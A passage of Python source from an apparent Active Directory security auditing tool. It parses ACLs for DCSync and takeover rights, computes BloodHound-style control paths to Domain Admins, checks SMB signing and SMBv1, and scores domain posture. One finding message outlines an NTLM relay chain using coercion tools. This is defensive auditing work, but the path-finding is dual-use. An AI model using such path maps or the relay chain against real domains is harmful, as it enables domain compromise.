                    try:
                        obj_type = _ace_object_type(ace["Ace"])
                        if obj_type and len(obj_type) == 16:
                            guid_str = _guid_from_bytes(bytes(obj_type))
                            dcsync_name = _DCSYNC_GUIDS.get(guid_str.strip("{}").lower())
                            if dcsync_name:
                                self.data.acl_findings.append({
                                    "type":      "dcsync",
                                    "object":    label,
                                    "dn":        dn,
                                    "sid":       sid_str_val,
                                    "sid_name":  principal_name,
                                    "right":     dcsync_name,
                                    "detail":    f"{principal_name} has {dcsync_name} on {label}",
                                })
                    except Exception:
                        pass

                # Dangerous masks on the object
                dangerous = _ACE_WRITE_DAC | _ACE_WRITE_OWNER | _ACE_GENERIC_ALL
                if mask & dangerous:
                    bits = []
                    if mask & _ACE_WRITE_DAC:    bits.append("WriteDACL")
                    if mask & _ACE_WRITE_OWNER:  bits.append("WriteOwner")
                    if mask & _ACE_GENERIC_ALL:  bits.append("GenericAll")
                    self.data.acl_findings.append({
                        "type":     "dangerous_acl",
                        "object":   label,
                        "dn":       dn,
                        "sid":      sid_str_val,
                        "sid_name": principal_name,
                        "right":    ",".join(bits),
                        "detail":   f"{principal_name} has {','.join(bits)} on {label}",
                    })

                # WriteProperty (GenericWrite or DS_WRITE_PROP)
                if mask & (_ACE_GENERIC_WRITE | _ACE_DS_WRITE_PROP):
                    self.data.acl_findings.append({
                        "type":     "write_property",
                        "object":   label,
                        "dn":       dn,
                        "sid":      sid_str_val,
                        "sid_name": principal_name,
                        "right":    "WriteProperty",
                        "detail":   f"{principal_name} has WriteProperty on {label}",
                    })
            except Exception:
                continue

    def _check_gpo_acl(self, dn: str, display_name: str):
        raw_sd = self._fetch_sd(dn)
        if not raw_sd:
            return
        sd = self._parse_dacl(raw_sd)
        if not sd:
            return
        dacl = sd["Dacl"]
        if not dacl:
            return
        for ace in dacl["Data"]:
            try:
                ace_type = ace["TypeName"]
                if "DENIED" in ace_type.upper():
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"])
                sid_str_val = self._sid_str(ace["Ace"]["Sid"])
                principal_name = self._broad.get(sid_str_val)
                if not principal_name:
                    continue
                write_bits = _ACE_WRITE_DAC | _ACE_WRITE_OWNER | _ACE_GENERIC_ALL | _ACE_DS_WRITE_PROP | _ACE_GENERIC_WRITE
                if mask & write_bits:
                    self.data.acl_findings.append({
                        "type":     "gpo_write",
                        "object":   display_name,
                        "dn":       dn,
                        "sid":      sid_str_val,
                        "sid_name": principal_name,
                        "right":    "GPO-Write",
                        "detail":   f"{principal_name} can modify GPO '{display_name}'",
                    })
            except Exception:
                continue


# ─────────────────────────────────────────────────────────────────────────────
# CONTROL-PATH GRAPH CLOSURE  ("who can become Domain Admin")
# ─────────────────────────────────────────────────────────────────────────────

class ControlPathAnalyzer:
    """Transitive closure over AD control edges (group membership + dangerous
    ACLs / ownership) to find every non-privileged principal that can reach a
    Tier-0 group. A BloodHound-style 'shortest path to Domain Admins', built from
    bulk security-descriptor reads so it scales without per-object queries."""

    # object-takeover rights on a target
    _TAKEOVER = _ACE_GENERIC_ALL | _ACE_GENERIC_WRITE | _ACE_WRITE_DAC | _ACE_WRITE_OWNER
    _MAX_PATHS = 25

    def __init__(self, conn: "ADConnection", data: "ADData", args):
        self.conn = conn; self.data = data; self.args = args
        self.sid2name = {}; self.dn2sid = {}; self.adj = defaultdict(list); self.radj = defaultdict(list)
        self.medges = defaultdict(list)  # membership-only (member -> group)
        self.sid2obj = {}   # sid -> ("user"|"computer"|"group", obj)
        self.dn2obj = {}    # dn.lower() -> ("user"|"computer"|"group", obj)

    def run(self):
        if not HAS_IMPACKET_LDAP:
            return
        print("[*] Computing control paths to Tier 0...")
        try:
            self._index()
            self._membership_edges()
            self._acl_edges()
            self._close()
        except Exception as e:
            if self.args.verbose:
                print(f"[!] control-path analysis failed: {e}")
                traceback.print_exc()

    # ── helpers ───────────────────────────────────────────────────────────────
    def _sid_of(self, obj):
        raw = obj["attrs"].get("objectSid")
        if isinstance(raw, list):
            raw = raw[0] if raw else None
        return sid_to_str(raw) if raw else ""

    def _index(self):
        d = self.data
        for kind, objs in (("user", d.users), ("computer", d.computers),
                           ("group", list(d.groups.values()))):
            for obj in objs:
                sid = self._sid_of(obj); dn = obj.get("dn","")
                sam = get_str(obj["attrs"], "sAMAccountName") or dn_base(dn)
                if dn:
                    self.dn2obj[dn.lower()] = (kind, obj)
                if not sid:
                    continue
                self.sid2name[sid] = sam
                self.sid2obj[sid] = (kind, obj)
                if dn:
                    self.dn2sid[dn.lower()] = sid
        # well-known + domain-relative broad principals
        self.sid2name.update({"S-1-1-0":"Everyone","S-1-5-11":"Authenticated Users",
                              "S-1-5-7":"Anonymous Logon"})
        self.broad = {"S-1-1-0","S-1-5-11","S-1-5-7"}
        dsid = ""
        if d.domain_obj:
            dsid = self._sid_of(d.domain_obj)
        self.dsid = dsid
        # Tier-0 seeds (group SIDs + domain root DN). 516/521/498 (Domain
        # Controllers / Read-only DCs / Enterprise Read-only DCs) are Tier-0 too:
        # without them, the DCs' legitimate, by-design DCSync rights on the domain
        # root were reported as a "non-privileged principal -> DA" control path
        # (e.g. "Domain Controllers --[DCSync]--> Domain root"). Seeding them also
        # folds DC machine accounts into the admin membership-closure so they are
        # not themselves flagged as control-path principals.
        self.seeds = set()
        for rid in (512, 519, 518, 548, 551, 549, 550, 520,    # DA/EA/Schema/AcctOp/BackupOp/SrvOp/PrintOp/GPCreator
                    516, 521, 498):                            # Domain Controllers / RODC / Enterprise RODC
            if dsid:
                self.seeds.add(f"{dsid}-{rid}")
        self.seeds |= {"S-1-5-32-544", "S-1-5-32-548", "S-1-5-32-551", "S-1-5-32-549", "S-1-5-32-550"}
        self.tier0_groups = set(self.seeds)
        self.domain_root = self.conn.base_dn.lower()
        self.seeds.add(self.domain_root)
        if dsid:
            self.broad |= {f"{dsid}-513", f"{dsid}-515"}  # Domain Users / Computers
            self.sid2name.setdefault(f"{dsid}-513", "Domain Users")
            self.sid2name.setdefault(f"{dsid}-515", "Domain Computers")

    def _node_name(self, node):
        if node == self.domain_root:
            return "Domain root"
        return self.sid2name.get(node, node)

    def _edge(self, src, dst, label, membership=False):
        if not src or not dst or src == dst:
            return
        self.adj[src].append((dst, label))
        self.radj[dst].append((src, label))
        if membership:
            self.medges[src].append(dst)

    def _membership_edges(self):
        # direct members of every group (member attr) -> the group SID
        for g in self.data.groups.values():
            gsid = self._sid_of(g)
            if not gsid:
                continue
            for mdn in get_list(g["attrs"], "member"):
                msid = self.dn2sid.get(mdn.lower())
                if msid:
                    self._edge(msid, gsid, "member of", membership=True)
        # primaryGroupID memberships into Tier-0 RIDs
        for obj in list(self.data.users) + list(self.data.computers):
            pg = get_int(obj["attrs"], "primaryGroupID", 0)
            if pg and self.dsid:
                gsid = f"{self.dsid}-{pg}"
                if gsid in self.sid2name:
                    self._edge(self._sid_of(obj), gsid, "primary group", membership=True)

    def _acl_edges(self):
        # Bulk-read SDs for groups, then for EVERY user and computer (roadmap 1 —
        # objectClass=user matches computers too, so one paged query covers both).
        # This catches paths routing through control over an arbitrary non-admin
        # object (e.g. WriteDacl over a computer that is in a privileged group, or
        # an RBCD/shadow-cred target), which the old admin-only read missed.
        for dn, sid, sd in self._bulk_sds("(objectClass=group)"):
            if sid:
                self._add_acl_edges(sd, sid, "group")
        for dn, sid, sd in self._bulk_sds("(objectClass=user)"):
            if sid:
                self._add_acl_edges(sd, sid, "object")
        # domain root (DCSync / takeover -> Tier 0)
        sd = self._fetch_one_sd(self.conn.base_dn)
        if sd:
            self._add_acl_edges(sd, self.domain_root, "domain root", dcsync=True)
        self._gpo_edges()

    @staticmethod
    def _parse_gplink(gplink: str) -> List[str]:
        """Extract linked GPO DNs from a gPLink value:
        [LDAP://cn={GUID},cn=policies,cn=system,DC=…;0][LDAP://…;2]."""
        if not gplink:
            return []
        out = []
        for m in re.finditer(r'\[LDAP://([^;\]]+);?(\d*)\]', gplink, re.I):
            if int(m.group(2) or 0) & 1:   # GPLINK_OPT_DISABLED -> link inactive
                continue
            out.append(m.group(1).strip())
        return out

    def _gpo_edges(self):
        """GPO control -> Tier 0, with real gPLink resolution (roadmap 1). A GPO
        only gets a Tier-0 edge when it is actually linked to a container that
        affects domain controllers; editing a GPO linked only to a workstation OU
        is SYSTEM on those hosts, not an automatic path to DA. Every GPO SD is
        bulk-read in one query."""
        d = self.data
        gpo_by_dn = {g.get("dn", "").lower(): g for g in d.gpos if g.get("dn")}
        # Containers whose linked GPOs reach Tier 0. GPO inheritance flows down the
        # WHOLE OU chain, so include every ancestor container of each DC (not just
        # the immediate parent), the domain root, and — since DCs live in sites and
        # site-linked GPOs apply to them — any AD site.
        tier0_containers = {self.domain_root}
        for dc in d.dcs:
            rest = dc.get("dn", "").lower()
            while "," in rest:
                rest = rest.split(",", 1)[1]
                tier0_containers.add(rest)
        for s in getattr(d, "sites", []):
            sdn = s.get("dn", "")
            if sdn:
                tier0_containers.add(sdn.lower())
        # GPO DN -> set of container DNs that link it (domain root, OUs, sites)
        linked = defaultdict(set)
        containers = []
        if d.domain_obj:
            containers.append((self.conn.base_dn, get_str(d.domain_obj["attrs"], "gPLink")))
        for cont in list(getattr(d, "ous", [])) + list(getattr(d, "sites", [])):
            containers.append((cont.get("dn", ""), get_str(cont["attrs"], "gPLink")))
        for cdn, gplink in containers:
            for gdn in self._parse_gplink(gplink):
                linked[gdn.lower()].add((cdn or "").lower())
        for dn, _sid, sd in self._bulk_sds("(objectClass=groupPolicyContainer)"):
            gpo = gpo_by_dn.get(dn.lower())
            if not sd or gpo is None:
                continue
            gnode = "GPO:" + dn.lower()
            self.sid2name[gnode] = "GPO " + (get_str(gpo["attrs"], "displayName") or dn_base(dn))
            self._add_acl_edges(sd, gnode, "gpo")
            link_cdns = linked.get(dn.lower(), set())
            if any(c in tier0_containers for c in link_cdns):
                self._edge(gnode, self.domain_root, "linked to DCs")
            # GPOs not linked to a DC-affecting container intentionally get no
            # Tier-0 edge — controlling them is still surfaced as a finding, but
            # it is not a path to Domain Admin.

    def _add_acl_edges(self, sd, target_node, kind, dcsync=False):
        try:
            if sd["OwnerSid"]:
                osid = sd["OwnerSid"].formatCanonical()
                if osid in self.sid2name and osid not in self.tier0_groups:
                    self._edge(osid, target_node, "owns")
        except Exception:
            pass
        dacl = sd["Dacl"]
        if not dacl:
            return
        for ace in dacl["Data"]:
            try:
                if "DENIED" in ace["TypeName"].upper():
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"])
                psid = ace["Ace"]["Sid"].formatCanonical()
                if psid not in self.sid2name or psid in self.tier0_groups:
                    continue  # only edges from resolvable, non-Tier-0 principals
                label = None
                if dcsync and "OBJECT" in ace["TypeName"].upper():
                    ot = _ace_object_type(ace["Ace"])
                    if ot and len(ot) == 16:
                        guid = _guid_from_bytes(bytes(ot)).strip("{}").lower()
                        if guid in _DCSYNC_GUIDS:
                            label = "DCSync"
                if label is None and (mask & self._TAKEOVER):
                    if mask & _ACE_GENERIC_ALL:   label = "GenericAll"
                    elif mask & _ACE_WRITE_DAC:   label = "WriteDacl"
                    elif mask & _ACE_WRITE_OWNER: label = "WriteOwner"
                    else:                          label = "GenericWrite"
                if label:
                    self._edge(psid, target_node, label)
            except Exception:
                continue

    def _close(self):
        # reverse BFS from Tier-0 seeds -> everything that can reach Tier 0
        reach = set(); dq = list(self.seeds)
        while dq:
            n = dq.pop()
            for src, _ in self.radj.get(n, []):
                if src not in reach:
                    reach.add(src); dq.append(src)
        # expected admins = pure-membership closure of Tier 0
        admins = set(); dq = list(self.seeds)
        while dq:
            n = dq.pop()
            for src, _ in self.radj.get(n, []):
                if src in admins:
                    continue
                # only follow this back-edge if it's a membership edge
                if any(dst == n for dst in self.medges.get(src, [])):
                    admins.add(src); dq.append(src)
        principals = {s for s in reach if s in self.sid2name and not s.startswith("GPO:")}
        control = principals - admins - self.tier0_groups - {self.domain_root}
        broad = [self.sid2name[s] for s in control if s in self.broad]
        # shortest path (forward BFS) for the most interesting principals
        prio = sorted(control, key=lambda s: (0 if s in self.broad else 1, self.sid2name.get(s,"")))
        paths = []
        for s in prio[:self._MAX_PATHS]:
            p = self._shortest(s)
            if p:
                paths.append((self.sid2name.get(s, s), p, s in self.broad))
        nodes, edges = self._build_node_registry(paths)
        self.data.control_paths = {"count": len(control), "broad": _dedup_keep_order(broad),
                                   "paths": paths, "nodes": nodes, "edges": edges}

    def _acct_info(self, kind, obj) -> Dict:
        """Per-principal facts the report shows in the node drawer (PingCastle-
        style): enabled, password age, last-logon age, kerberoastable, stale."""
        a = obj["attrs"]
        uac = get_int(a, "userAccountControl")
        sam = get_str(a, "sAMAccountName") or dn_base(obj.get("dn", ""))
        enabled = not uac_has(uac, UAC_ACCOUNTDISABLE)
        pwd_age = days_since(filetime_to_dt(get_int(a, "pwdLastSet")))
        logon_age = days_since(filetime_to_dt(get_int(a, "lastLogonTimestamp")))
        spn = bool(get_list(a, "servicePrincipalName"))
        stale = bool(enabled and (logon_age is None or logon_age > 90))
        return {"sam": sam, "kind": kind, "enabled": enabled, "pwd_age": pwd_age,
                "logon_age": logon_age, "spn": spn, "stale": stale}

    def _node_meta(self, name) -> Dict:
        """Metadata for one path node, keyed by its display name. Drives the
        clickable node drawer + graph in the report."""
        meta = {"label": name, "type": "object", "sid": "", "enabled": None,
                "pwd_age": None, "logon_age": None, "spn": False, "stale": False,
                "tier0": False, "members": [], "member_count": 0, "note": ""}
        if name == "Domain root":
            meta.update(type="domain", tier0=True,
                        note="The domain head object. DCSync or takeover here is full domain compromise.")
            return meta
        if name.startswith("GPO "):
            meta.update(type="gpo",
                        note="Editing a linked GPO runs code as SYSTEM on every computer it applies to.")
            return meta
        if name in ("Everyone", "Authenticated Users", "Anonymous Logon",
                    "Domain Users", "Domain Computers"):
            meta.update(type="broad",
                        note="Built-in broad principal — effectively every "
                             "(authenticated) user in the domain.")
            return meta
        sid = self._name2sid.get(name, "")
        meta["sid"] = sid
        if sid in self.tier0_groups:
            meta["tier0"] = True
        ent = self.sid2obj.get(sid)
        if not ent:
            return meta
        kind, obj = ent
        meta["type"] = kind
        if kind in ("user", "computer"):
            info = self._acct_info(kind, obj)
            meta.update(enabled=info["enabled"], pwd_age=info["pwd_age"],
                        logon_age=info["logon_age"], spn=info["spn"], stale=info["stale"])
        elif kind == "group":
            mdns = get_list(obj["attrs"], "member")
            meta["member_count"] = len(mdns)
            members = []
            for mdn in mdns[:80]:
                me = self.dn2obj.get(mdn.lower())
                if me:
                    members.append(self._acct_info(me[0], me[1]))
                else:
                    members.append({"sam": dn_base(mdn), "kind": "external",
                                    "enabled": None, "pwd_age": None,
                                    "logon_age": None, "spn": False, "stale": False})
            meta["members"] = members
        return meta

    def _build_node_registry(self, paths):
        """Collect node metadata + the unique edge set across the emitted paths,
        for the clickable drawer and the graph visual in the report."""
        self._name2sid = {nm: sid for sid, nm in self.sid2name.items()}
        nodes, edges, seen_edge = {}, [], set()
        for _name, path, _broad in paths:
            for src, label, dst in path:
                for nm in (src, dst):
                    if nm not in nodes:
                        nodes[nm] = self._node_meta(nm)
                ek = (src, label, dst)
                if ek not in seen_edge:
                    seen_edge.add(ek)
                    edges.append({"src": src, "label": label, "dst": dst})
        return nodes, edges

    def _shortest(self, start):
        from collections import deque
        seen = {start}; q = deque([(start, [])])
        while q:
            node, path = q.popleft()
            for dst, label in self.adj.get(node, []):
                if dst in self.seeds:
                    return path + [(self._node_name(node), label, self._node_name(dst))]
                if dst not in seen and len(path) < 6:
                    seen.add(dst); q.append((dst, path + [(self._node_name(node), label, self._node_name(dst))]))
        return []

    # ── bulk SD reader (both backends) ────────────────────────────────────────
    def _bulk_sds(self, ldap_filter):
        out = []
        if getattr(self.conn, "_impacket", None):
            try:
                from impacket.ldap.ldapasn1 import Control, SimplePagedResultsControl, Scope as LDAPScope
                from pyasn1.codec.ber import encoder
                from pyasn1.type import univ
                sdctrl = Control(); sdctrl["controlType"] = "1.2.840.113556.1.4.801"
                seq = univ.Sequence(); seq.setComponentByPosition(0, univ.Integer(0x05))
                sdctrl["controlValue"] = encoder.encode(seq)
                paged = SimplePagedResultsControl(size=500)
                resp = self.conn._impacket.search(
                    searchBase=self.conn.base_dn, searchFilter=ldap_filter,
                    attributes=["objectSid","nTSecurityDescriptor"],
                    searchControls=[sdctrl, paged])
                for e in resp:
                    try:
                        dn = str(e["objectName"]); sid = ""; sdb = None
                        for a in e["attributes"]:
                            t = str(a["type"])
                            if t == "objectSid" and a["vals"]:
                                sid = sid_to_str(bytes(a["vals"][0]))
                            elif t == "nTSecurityDescriptor" and a["vals"]:
                                sdb = bytes(a["vals"][0])
                        if sdb:
                            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(); sd.fromString(sdb)
                            out.append((dn, sid, sd))
                    except Exception:
                        continue
            except Exception as e:
                if self.args.verbose:
                    print(f"[!] bulk SD (impacket) failed: {e}")
            return out
        try:
            from ldap3.protocol.microsoft import security_descriptor_control as sdc
            # security_descriptor_control() returns a list already — pass it
            # directly, not wrapped in [ ] (see _fetch_sd note above).
            gen = self.conn.conn.extend.standard.paged_search(
                search_base=self.conn.base_dn, search_filter=ldap_filter,
                search_scope=ldap3.SUBTREE, attributes=["objectSid","nTSecurityDescriptor"],
                controls=sdc(sdflags=0x05), paged_size=500, generator=True)
            for e in gen:
                # Per-entry guard: an object with an empty SD/SID list previously
                # raised IndexError (sdb[0] on []) and, because the try wrapped the
                # whole loop, aborted the ENTIRE read — dropping every edge after
                # the first such object (e.g. the full user/computer SD closure).
                try:
                    if e.get("type") != "searchResEntry":
                        continue
                    raw = e.get("raw_attributes", {})
                    sdb = raw.get("nTSecurityDescriptor") or []
                    sdb = (sdb[0] if isinstance(sdb, list) else sdb) if sdb else None
                    sraw = raw.get("objectSid") or []
                    sraw = (sraw[0] if isinstance(sraw, list) else sraw) if sraw else None
                    if sdb:
                        sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(); sd.fromString(sdb)
                        out.append((e.get("dn", ""), sid_to_str(sraw) if sraw else "", sd))
                except Exception:
                    continue
        except Exception as e:
            if self.args.verbose:
                print(f"[!] bulk SD (ldap3) failed: {e}")
        return out

    def _fetch_one_sd(self, dn):
        a = ACLAnalyzer(self.conn, self.data, self.args)
        raw = a._fetch_sd(dn)
        if not raw:
            return None
        return a._parse_dacl(raw)


# ─────────────────────────────────────────────────────────────────────────────
# SMB CHECKS
# ─────────────────────────────────────────────────────────────────────────────

class SMBChecker:
    def __init__(self, target: str, args, findings: List[Finding]):
        self.target   = target
        self.args     = args
        self.findings = findings

    def _add(self, rule_id: str, details: str = "", affected: List[str] = None):
        if rule_id in SUPPRESSED_RULES:
            return
        t, cat, pts, sev = RULES.get(rule_id,
                           (rule_id, "Anomaly", 5, "MEDIUM"))
        aff = _dedup_keep_order(affected or [])
        self.findings.append(Finding(
            rule_id=rule_id, title=t, category=cat,
            points=scaled_points(rule_id, pts, len(aff)), severity=sev,
            details=details, affected=aff,
            maturity=rule_maturity(rule_id, sev),
            mitre=RULE_MITRE.get(rule_id, [])))

    def run(self):
        if not HAS_IMPACKET_SMB:
            print("[!] impacket not available — skipping SMB checks")
            return
        print("[*] Running SMB checks...")
        self._check_smb_signing()
        self._check_smbv1()

    def _get_smb_conn(self) -> Optional["SMBConnection"]:
        try:
            # Kerberos needs the FQDN as remoteName for the cifs/<fqdn> SPN.
            remote_name = (self.args.dc_host or self.target) if self.args.kerberos else self.target
            smb = SMBConnection(remote_name, self.target, timeout=10)
            if self.args.kerberos:
                lm = nt = ""
                if self.args.hashes:
                    h = self.args.hashes
                    lm, nt = (h.split(":", 1) if ":" in h else ("", h))
                smb.kerberosLogin(self.args.username or "",
                                  self.args.password or "",
                                  self.args.domain or "", lm, nt,
                                  self.args.aes_key or "",
                                  kdcHost=self.args.dc_ip,
                                  useCache=bool(os.environ.get("KRB5CCNAME")))
            elif self.args.hashes:
                lm = nt = ""
                h = self.args.hashes
                if ":" in h:
                    lm, nt = h.split(":", 1)
                else:
                    nt = h
                smb.login(self.args.username or "",
                          self.args.password or "",
                          self.args.domain or "",
                          lm, nt)
            elif self.args.null_session:
                smb.login("", "", "")
            elif self.args.username and self.args.password:
                smb.login(self.args.username,
                          self.args.password,
                          self.args.domain or "")
            else:
                smb.login("", "", "")
            return smb
        except Exception as e:
            if self.args.verbose:
                print(f"[!] SMB connect failed: {e}")
            return None

    def _check_smb_signing(self):
        # Reuse the authenticated connection (handles password/hash/Kerberos) and
        # ask impacket directly whether the server REQUIRES SMB signing — the
        # security-relevant flag for NTLM relay.
        smb = self._get_smb_conn()
        if smb is None:
            return
        try:
            required = smb.isSigningRequired()
        except Exception as e:
            if self.args.verbose:
                print(f"[!] SMB signing check failed: {e}")
            return
        finally:
            try:
                smb.logoff()
            except Exception:
                pass
        if not required:
            self._add("A-SMB2SignatureNotRequired",
                      f"{self.target}: SMB signing is NOT required by the server. "
                      "Unsigned SMB sessions can be relayed (impacket-ntlmrelayx) — "
                      "coerce DC/host auth (PetitPotam/PrinterBug) and relay to this "
                      "or another host for code execution or ADCS (ESC8).",
                      [self.target])

    def _check_smbv1(self):
        try:
            smb1 = SMBConnection(self.target, self.target, timeout=10,
                                 preferredDialect="NT LM 0.12")
            smb1.login("", "", "")
            dialect = smb1.getDialect()
            smb1.logoff()
            if dialect == "NT LM 0.12":
                self._add("S-SMB-v1",
                          f"{self.target} negotiated SMBv1 (NT LM 0.12). "
                          "SMBv1 should be disabled — EternalBlue (MS17-010) risk.",
                          [self.target])
        except Exception:
            pass  # SMBv1 rejection is expected / desired


# ─────────────────────────────────────────────────────────────────────────────
# RISK SCORER
# ─────────────────────────────────────────────────────────────────────────────

# ── SCOUT risk model ──────────────────────────────────────────────────────────
# Two orthogonal RISK axes (higher = worse) feed one POSTURE score (higher = better):
#   EXPOSURE (0-100) = how reachable Tier-0 is, defined by the *easiest* attack
#       path available to the operator. A domain with one ESC1 template and a
#       domain with GPP+DCSync are both bad, but a hardened domain with no path
#       scores near zero — so the number actually differentiates.
#   HYGIENE DEBT (0-100) = prevalence-graded misconfiguration/stale debt, so size
#       and sloppiness of the estate move the number continuously.
#   POSTURE (0-100, higher = stronger) + A-F GRADE = the headline (Insight-Recon
#       style: "77 · C · Moderate Risk"). 100 − severity-weighted finding
#       deductions (per-severity caps) − an exposure penalty, so it differentiates
#       (clean = A; a few mediums = C; crits / a live Tier-0 path = F) rather than
#       pinning at 100/0 like a single saturating gauge would.

# rule_id -> attacker effort to convert it into Tier-0 access (higher = easier).
EXPOSURE_WEIGHTS = {
    # one wrong ACE / unauth -> domain compromise
    "P-DCSync":100, "P-DangerousACLDomain":100, "P-DangerousACLDA":100,
    "P-WriteToPrivGroup":100, "A-MembershipEveryone":100, "P-RBCD-Dangerous":100,
    "P-OwnsPrivObject":97, "P-DelegationEveryone":96, "P-PrivilegeEveryone":94,
    "P-DelegationKeyAdmin":92,
    # any authenticated user, trivially
    "P-GPPPassword":95, "A-CertTempCustomSubject":95, "P-ComputerInPrivGroup":94,
    "S-SIDHistoryPrivileged":94, "A-CertTemplateESC4":92, "P-ServiceDomainAdmin":92,
    "P-ModifiableGPO":90, "P-DangerousExtendedRight":90, "S-Vuln-MS14-068":90,
    # reliable but needs cracking / coercion / a foothold
    "S-KerberoastableAdmin":85, "S-NoPreAuthAdmin":85, "A-CertEnrollHttp":85,
    "P-UnconstrainedDelegation":84, "A-CertTempAgent":84, "A-CertTempAnyPurpose":82,
    "T-SIDHistoryDangerous":82, "A-DC-Coerce":80, "T-TGTDelegation":78,
    "S-Vuln-MS17_010":78, "P-DelegationDCt2a4d":82, "P-DelegationDCa2d2":82,
    # moderate / multi-step
    "P-DNSAdmin":70, "A-DnsZoneAUCreateChild":70, "A-WSUS-HTTP":70,
    "P-Kerberoasting":66, "A-WDigest":64, "A-LMCompatibilityLevel":64,
    "A-LMHashAuthorized":62, "P-ExchangePrivEsc":80, "A-BadSuccessor":88,
    # foothold-dependent / lower leverage
    "S-Kerberoastable":55, "S-NoPreAuth":52, "P-ConstrainedDelegService":55,
    "P-RBCD":55, "A-ReversiblePwd":52, "S-Reversible":52, "P-MachineAccountQuota":48,
    "A-DCLdapSign":45, "A-SMB2SignatureNotRequired":45, "A-DCLdapsChannelBinding":42,
    "S-DesEnabled":45, "A-NullSession":40, "P-AdminCountOrphan":35,
    "A-SCCM":72, "A-Pre2kComputer":78, "A-WeakLockout":40, "S-OS-NT":78,
    "A-CertCAManageLowPriv":88, "A-CertTemplateESC9":80,
    "P-ControlPathDA":92, "P-ControlPathIndirectEveryone":95, "P-ControlPathIndirectMany":70,
    "A-SCCMContainerACL":75, "P-GMSAReadable":88, "A-KDSRootKey":90,
    "A-AADConnectSync":70, "A-SeamlessSSO":60,
}

# rule_id -> (mode, weight). mode 'flat' adds weight; mode 'pct_users'/'pct_comps'
# scales weight by the fraction of (enabled) users/computers affected.
HYGIENE_WEIGHTS = {
    "S-Inactive":("pct_users",16), "S-PwdLastSet-90":("pct_users",12),
    "S-PwdLastSet-45":("pct_users",6), "S-PwdNeverExpires":("pct_users",8),
    "S-PwdNotRequired":("pct_users",10), "S-AesNotEnabled":("pct_users",6),
    "S-C-Inactive":("pct_comps",14), "S-C-PrimaryGroup":("pct_comps",4),
    "A-LAPS-Not-Installed":("flat",12), "A-LAPS-Joined-Computers":("pct_comps",8),
    "A-LocalAdminPassword":("flat",12), "S-OS-NT":("flat",14), "S-OS-XP":("flat",12),
    "S-OS-Vista":("flat",8), "S-OS-W10":("flat",4), "S-SMB-v1":("flat",10),
    "A-MinPwdLen":("flat",8), "A-PwdComplexity":("flat",6), "A-PwdHistory":("flat",3),
    "A-PwdMaxAge":("flat",3), "A-Krbtgt":("flat",8), "A-DCLdapSign":("flat",6),
    "A-SMB2SignatureNotRequired":("flat",6), "A-SMB2SignatureNotEnabled":("flat",8),
    "A-ReversiblePwd":("flat",8), "S-DesEnabled":("flat",6), "P-RecycleBin":("flat",3),
    "A-Guest":("flat",4), "P-AdminNum":("flat",6), "P-AdminPwdTooOld":("flat",5),
    "P-Inactive":("flat",6), "S-FunctionalLevel1":("flat",10), "S-FunctionalLevel3":("flat",5),
    "S-DC-NotUpdated":("flat",5), "A-LLMNR":("flat",4), "A-NBTNSDisabled":("flat",3),
    "A-HardenedPaths":("flat",4), "A-CredentialGuard":("flat",4), "P-ProtectedUsers":("flat",5),
    "S-SIDHistory":("flat",4), "A-RestrictRemoteSAM":("flat",3), "P-MachineAccountQuota":("flat",5),
}



# Posture-grade deduction model (higher posture = stronger). Per-severity point
# cost and a cap on how much any one severity tier can drag the score down, so
# breadth degrades the grade smoothly without one tier alone zeroing it. Tuned so
# a clean domain = A, a few mediums = B/C, several highs = C/D — while the
# exposure ceiling (RiskScorer.posture) keeps a reachable/compromisable domain
# capped at D/F no matter how few findings drive it.
POSTURE_DEDUCT = {"CRITICAL":12.0, "HIGH":4.0, "MEDIUM":2.0, "LOW":0.6, "INFO":0.0}
POSTURE_CAP    = {"CRITICAL":40.0, "HIGH":24.0, "MEDIUM":12.0, "LOW":6.0, "INFO":0.0}


class RiskScorer:
    def __init__(self, findings: List[Finding], data=None):
        self.findings = findings
        self.data = data

    def exposure(self) -> int:
        """Easiest path to Tier-0 defines exposure; a little breadth bonus so a
        domain with many high-leverage paths edges out one with a single path."""
        if not self.findings:
            return 0
        weights = sorted((EXPOSURE_WEIGHTS.get(f.rule_id, 0)
                          for f in {f.rule_id: f for f in self.findings}.values()),
                         reverse=True)
        top = weights[0] if weights else 0
        if top == 0:
            return 0
        breadth = sum(1 for w in weights if w >= 70) - 1
        return int(min(100, top + min(8, max(0, breadth) * 2)))

    def hygiene(self) -> int:
        nu = nc = 1
        if self.data is not None:
            nu = max(1, sum(1 for u in self.data.users
                            if not uac_has(get_int(u["attrs"], "userAccountControl"), UAC_ACCOUNTDISABLE)))
            nc = max(1, sum(1 for c in self.data.computers
                            if not uac_has(get_int(c["attrs"], "userAccountControl"), UAC_ACCOUNTDISABLE)))
        debt = 0.0
        seen = {}
        for f in self.findings:
            seen.setdefault(f.rule_id, f)
        for rid, f in seen.items():
            spec = HYGIENE_WEIGHTS.get(rid)
            if not spec:
                continue
            mode, w = spec
            if mode == "flat":
                debt += w
            elif mode == "pct_users":
                debt += w * min(1.0, len(f.affected) / nu)
            elif mode == "pct_comps":
                debt += w * min(1.0, len(f.affected) / nc)
        return int(min(100, round(debt)))

    def posture(self) -> int:
        """Overall AD posture, 0–100 where HIGHER = STRONGER (Insight-Recon
        convention). 100 minus severity-weighted finding deductions (deduped by
        rule, each tier capped) minus a small exposure penalty, then clamped by
        an *exposure ceiling*: a domain whose Tier-0 is reachable
        (exposure ≥ 60) or one-step compromisable (≥ 85) cannot read as a healthy
        grade no matter how few findings drove it. Differentiates A–D for
        defensible domains while keeping owned domains honestly at F."""
        seen = {}
        for f in self.findings:
            seen.setdefault(f.rule_id, f)
        sev_count = defaultdict(int)
        for f in seen.values():
            sev_count[f.severity] += 1
        deduction = 0.0
        for sev, n in sev_count.items():
            per = POSTURE_DEDUCT.get(sev, 0.0); cap = POSTURE_CAP.get(sev, 0.0)
            deduction += min(cap, per * n)
        exp = self.exposure()
        raw = 100 - deduction - min(18.0, exp * 0.18)
        ceiling = 39 if exp >= 85 else 64 if exp >= 60 else 79 if exp >= 35 else 100
        return int(max(0, min(100, round(min(raw, ceiling)))))

    @staticmethod
    def grade(posture: int) -> Tuple[str, str, str]:
        """(letter, risk word, color) from a posture score (higher = better)."""
        if posture >= 90: return "A", "Strong",        "#6f8f3f"
        if posture >= 80: return "B", "Good",          "#869150"
        if posture >= 70: return "C", "Moderate risk", "#cda52b"
        if posture >= 60: return "D", "Weak",          "#cb7a2f"
